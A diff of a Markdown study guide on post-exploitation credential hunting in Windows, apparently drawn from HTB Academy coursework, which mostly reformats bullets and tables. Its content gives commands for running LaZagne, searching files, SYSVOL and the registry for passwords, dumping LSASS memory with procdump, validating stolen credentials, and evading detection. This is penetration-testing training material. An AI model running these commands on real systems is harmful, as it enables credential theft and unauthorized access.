@@ -1,36 +1,39 @@
-# Credential Hunting in Windows
+# 🕵️ Credential Hunting in Windows
 
 ## 🎯 Overview
 
 **Credential hunting** is the process of performing detailed searches across the file system and through various applications to discover credentials after gaining access to a Windows system. This post-exploitation technique can provide significant advantages by uncovering:
 
-- **Stored application passwords** (browsers, email clients, FTP tools)
-- **Configuration files** with embedded credentials
-- **User documents** containing password lists
-- **Script files** with hardcoded credentials
-- **Windows credential stores** and password managers
+* **Stored application passwords** (browsers, email clients, FTP tools)
+* **Configuration files** with embedded credentials
+* **User documents** containing password lists
+* **Script files** with hardcoded credentials
+* **Windows credential stores** and password managers
 
 > **"A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files."**
 
 ## 🧠 Search-Centric Methodology
 
 ### Context-Driven Approach
+
 Before starting credential hunting, consider the **target system's purpose**:
 
-- **IT Admin workstation** → Look for network device passwords, server credentials, documentation
-- **Developer machine** → Search for database connections, API keys, deployment scripts
-- **User workstation** → Focus on saved browser passwords, personal password files
-- **Server system** → Check service accounts, configuration files, application credentials
+* **IT Admin workstation** → Look for network device passwords, server credentials, documentation
+* **Developer machine** → Search for database connections, API keys, deployment scripts
+* **User workstation** → Focus on saved browser passwords, personal password files
+* **Server system** → Check service accounts, configuration files, application credentials
 
 ### Strategic Questions
-- What might the user be doing on a day-to-day basis?
-- Which tasks require credentials?
-- What applications are installed?
-- What network resources does this system access?
+
+* What might the user be doing on a day-to-day basis?
+* Which tasks require credentials?
+* What applications are installed?
+* What network resources does this system access?
 
 ## 🔍 Key Terms and Search Patterns
 
 ### Primary Keywords
+
 ```
 Passwords
 Passphrases
@@ -49,6 +52,7 @@ Credentials
 ```
 
 ### Extended Search Terms
+
 ```bash
 # Authentication-related
 auth
@@ -78,6 +82,7 @@ private_key
 ## 🔧 Search Tools and Techniques
 
 ### 1. Windows Search (GUI)
+
 **Use Case**: Quick desktop search for files containing credential keywords
 
 ```
@@ -91,13 +96,15 @@ private_key
 ```
 
 **Benefits**:
-- ✅ Built-in, no additional tools needed
-- ✅ Searches file contents, not just names
-- ✅ Includes system settings and applications
+
+* ✅ Built-in, no additional tools needed
+* ✅ Searches file contents, not just names
+* ✅ Includes system settings and applications
 
 **Limitations**:
-- ❌ Limited to indexed locations
-- ❌ May miss hidden or system files
+
+* ❌ Limited to indexed locations
+* ❌ May miss hidden or system files
 
 ### 2. LaZagne - Automated Credential Extraction
 
@@ -105,21 +112,21 @@ private_key
 
 #### Core Module Categories
 
-| Module | Description | Software Targets |
-|--------|-------------|------------------|
-| **browsers** | Web browser saved passwords | Chrome, Firefox, Edge, Opera, Safari |
-| **chats** | Chat application credentials | Skype, Discord, Telegram |
-| **databases** | Database connection strings | MySQL, PostgreSQL, SQLite |
-| **games** | Gaming platform credentials | Steam, Battle.net |
-| **git** | Git repository credentials | GitHub, GitLab tokens |
-| **mail** | Email client passwords | Outlook, Thunderbird |
-| **memory** | In-memory password dumps | KeePass, LSASS |
-| **multimedia** | Media application creds | VLC, Spotify |
-| **php** | PHP application passwords | Composer, PHPMyAdmin |
-| **svn** | Subversion credentials | TortoiseSVN |
-| **sysadmin** | System administration tools | WinSCP, PuTTY, OpenVPN, FileZilla |
-| **windows** | Windows credential stores | Credential Manager, LSA Secrets |
-| **wifi** | Wireless network passwords | Saved WiFi profiles |
+| Module         | Description                  | Software Targets                     |
+| -------------- | ---------------------------- | ------------------------------------ |
+| **browsers**   | Web browser saved passwords  | Chrome, Firefox, Edge, Opera, Safari |
+| **chats**      | Chat application credentials | Skype, Discord, Telegram             |
+| **databases**  | Database connection strings  | MySQL, PostgreSQL, SQLite            |
+| **games**      | Gaming platform credentials  | Steam, Battle.net                    |
+| **git**        | Git repository credentials   | GitHub, GitLab tokens                |
+| **mail**       | Email client passwords       | Outlook, Thunderbird                 |
+| **memory**     | In-memory password dumps     | KeePass, LSASS                       |
+| **multimedia** | Media application creds      | VLC, Spotify                         |
+| **php**        | PHP application passwords    | Composer, PHPMyAdmin                 |
+| **svn**        | Subversion credentials       | TortoiseSVN                          |
+| **sysadmin**   | System administration tools  | WinSCP, PuTTY, OpenVPN, FileZilla    |
+| **windows**    | Windows credential stores    | Credential Manager, LSA Secrets      |
+| **wifi**       | Wireless network passwords   | Saved WiFi profiles                  |
 
 #### LaZagne Usage
 
@@ -143,6 +150,7 @@ C:\temp> LaZagne.exe all -oN results.txt
 ```
 
 #### Example LaZagne Output
+
 ```
 |====================================================================|
 |                                                                    |
@@ -179,6 +187,7 @@ Password: Switch3sAr3Gr3at!
 **findstr** allows flexible pattern matching across multiple file types.
 
 #### Basic findstr Syntax
+
 ```cmd
 # Search for "password" in text files
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config
@@ -191,6 +200,7 @@ findstr /I /S /M "password" *.*
 ```
 
 #### Advanced findstr Patterns
+
 ```cmd
 # Network credentials
 findstr /SIM /C:"ssh" /C:"ftp" /C:"rdp" *.txt *.cfg *.ps1 *.bat
@@ -209,6 +219,7 @@ findstr /SIM /C:"github" /C:"gitlab" /C:"git clone" *.txt *.ps1 *.bat
 ```
 
 #### findstr Flags Explained
+
 ```
 /S    - Search subdirectories recursively
 /I    - Case-insensitive search
@@ -237,6 +248,7 @@ Get-ItemProperty -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
 ## 📂 High-Value Target Locations
 
 ### File System Locations
+
 ```bash
 # User directories
 C:\Users\%USERNAME%\Documents\
@@ -257,6 +269,7 @@ C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\
 ```
 
 ### Registry Locations
+
 ```cmd
 # Windows autologon
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -269,6 +282,7 @@ reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
 ```
 
 ### Network Share Locations
+
 ```bash
 # SYSVOL share (Domain environments)
 \\domain.local\SYSVOL\domain.local\scripts\
@@ -283,6 +297,7 @@ reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
 ## 🏢 Enterprise-Specific Locations
 
 ### Group Policy and Domain Assets
+
 ```bash
 # Group Policy passwords (deprecated but still found)
 \\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
@@ -296,6 +311,7 @@ findstr /S /I cpassword \\domain.local\sysvol\domain.local\*.xml
 ```
 
 ### Development and IT Infrastructure
+
 ```bash
 # Web.config files (development systems)
 findstr /SIM /C:"connectionString" /C:"appSettings" *.config
@@ -312,6 +328,7 @@ passwords.docx, passwords.xlsx, creds.txt on network drives
 ```
 
 ### Active Directory User Descriptions
+
 ```powershell
 # Check AD user descriptions for passwords
 Get-ADUser -Filter * -Properties Description | Where {$_.Description -ne $null}
@@ -327,6 +344,7 @@ Get-ADUser -Filter * -Properties Description | Where {$_.Description -ne $null}
 Before beginning credential hunting, assess the target environment:
 
 #### System Purpose Assessment
+
 ```cmd
 # Check installed applications
 wmic product get name
@@ -342,6 +360,7 @@ Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
 ```
 
 #### User Context Analysis
+
 ```cmd
 # Current user information
 whoami /all
@@ -358,6 +377,7 @@ wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text /c:10
 ### Credential Discovery Workflow
 
 #### Phase 1: Automated Discovery
+
 ```cmd
 # Step 1: Transfer and run LaZagne
 # Download from: https://github.com/AlessandroZ/LaZagne/releases
@@ -371,6 +391,7 @@ C:\temp> LaZagne.exe databases     # Database connections
 ```
 
 #### Phase 2: Manual File System Search
+
 ```cmd
 # Search for common credential files
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml *.json
@@ -386,6 +407,7 @@ findstr /SIM /C:"service" /C:"account" /C:"admin" *.txt *.ps1 *.bat
 ```
 
 #### Phase 3: Registry and System Analysis
+
 ```cmd
 # Check stored credentials
 cmdkey /list
@@ -405,6 +427,7 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 ### Application-Specific Hunting Techniques
 
 #### Browser Credential Extraction
+
 ```cmd
 # Chrome passwords (requires user context)
 LaZagne.exe browsers -v
@@ -417,6 +440,7 @@ LaZagne.exe browsers -v | findstr -i edge
 ```
 
 #### Network Administration Tools
+
 ```cmd
 # WinSCP stored sessions
 reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
@@ -430,6 +454,7 @@ type "%APPDATA%\FileZilla\recentservers.xml"
 ```
 
 #### Development Environment Credentials
+
 ```cmd
 # Git credentials
 findstr /SIM /C:"github" /C:"gitlab" /C:"git clone" *.txt *.ps1 *.bat
@@ -445,6 +470,7 @@ findstr /SIM /C:"env" /C:"config" /C:"settings" *.json *.ini *.cfg
 ### Advanced Discovery Techniques
 
 #### Memory-Based Credential Extraction
+
 ```cmd
 # Process memory dumps (requires elevated privileges)
 procdump -ma lsass.exe lsass.dmp
@@ -457,6 +483,7 @@ tasklist | findstr -i "keepass\|password\|vault"
 ```
 
 #### Network Share Enumeration
+
 ```cmd
 # Local shares
 net share
@@ -470,6 +497,7 @@ findstr /S /I cpassword \\domain.local\sysvol\domain.local\*.xml
 ```
 
 #### Alternative Data Streams and Hidden Files
+
 ```cmd
 # Check for alternate data streams
 dir /R C:\Users\%USERNAME%\Documents\
@@ -485,6 +513,7 @@ type C:\Windows\System32\sysprep\unattend.xml | findstr /i password
 ### Documentation and Validation
 
 #### Credential Organization
+
 ```
 # Create structured credential inventory
 Date: [timestamp]
@@ -499,6 +528,7 @@ WinSCP              | admin      | secret456      | registry   | YES
 ```
 
 #### Immediate Validation
+
 ```cmd
 # Test SSH credentials
 ssh username@target-ip
@@ -516,12 +546,14 @@ curl -u username:password https://target/api/test
 ## 🛡️ Detection and Evasion
 
 ### Common Detection Methods
-- **File access monitoring** - Unusual file access patterns
-- **Process monitoring** - LaZagne execution
-- **Network monitoring** - Data exfiltration
-- **Registry monitoring** - Credential store access
+
+* **File access monitoring** - Unusual file access patterns
+* **Process monitoring** - LaZagne execution
+* **Network monitoring** - Data exfiltration
+* **Registry monitoring** - Credential store access
 
 ### Evasion Techniques
+
 ```cmd
 # Use legitimate Windows tools
 findstr instead of custom tools when possible
@@ -539,6 +571,7 @@ timeout /t 5 && findstr /SIM "password" *.txt
 ## 🎯 Success Metrics and Validation
 
 ### Credential Quality Assessment
+
 ```bash
 # Test discovered credentials immediately
 net use \\target\share /user:domain\username password
@@ -551,6 +584,7 @@ sqlcmd -S server -U username -P password
 ```
 
 ### Documentation Format
+
 ```
 # Credential Discovery Log
 Date: [timestamp]
@@ -565,33 +599,38 @@ Validated: [Yes/No]
 ## 📋 Quick Reference Checklist
 
 ### Initial Assessment
-- [ ] Identify system purpose (admin/dev/user workstation)
-- [ ] Note installed applications
-- [ ] Check user privilege level
-- [ ] Identify network connectivity
+
+* [ ] Identify system purpose (admin/dev/user workstation)
+* [ ] Note installed applications
+* [ ] Check user privilege level
+* [ ] Identify network connectivity
 
 ### Automated Tools
-- [ ] Transfer and run LaZagne with all modules
-- [ ] Save LaZagne output to file
-- [ ] Focus on high-value modules (browsers, sysadmin, windows)
+
+* [ ] Transfer and run LaZagne with all modules
+* [ ] Save LaZagne output to file
+* [ ] Focus on high-value modules (browsers, sysadmin, windows)
 
 ### Manual Searches
-- [ ] findstr for common password patterns
-- [ ] Search user Documents and Desktop
-- [ ] Check Downloads folder for password files
-- [ ] Review browser bookmarks for service URLs
 
-### Advanced Techniques  
-- [ ] Registry searches for stored credentials
-- [ ] Network share enumeration (if domain-joined)
-- [ ] Configuration file analysis
-- [ ] Memory dumps (if elevated privileges)
+* [ ] findstr for common password patterns
+* [ ] Search user Documents and Desktop
+* [ ] Check Downloads folder for password files
+* [ ] Review browser bookmarks for service URLs
+
+### Advanced Techniques
+
+* [ ] Registry searches for stored credentials
+* [ ] Network share enumeration (if domain-joined)
+* [ ] Configuration file analysis
+* [ ] Memory dumps (if elevated privileges)
 
 ### Validation
-- [ ] Test discovered credentials immediately
-- [ ] Document all findings with timestamps
-- [ ] Note credential sources for reporting
-- [ ] Identify high-value targets for further exploitation
+
+* [ ] Test discovered credentials immediately
+* [ ] Document all findings with timestamps
+* [ ] Note credential sources for reporting
+* [ ] Identify high-value targets for further exploitation
 
 ## 💡 Key Takeaways
 
@@ -603,6 +642,6 @@ Validated: [Yes/No]
 6. **Test immediately** - Validate credentials as soon as they're found
 7. **Think like the user** - Where would you store passwords if you were them?
 
----
+***
 
-*This guide provides comprehensive coverage of credential hunting techniques for Windows environments, based on HTB Academy's Password Attacks module.* 
+_This guide provides comprehensive coverage of credential hunting techniques for Windows environments, based on HTB Academy's Password Attacks module._
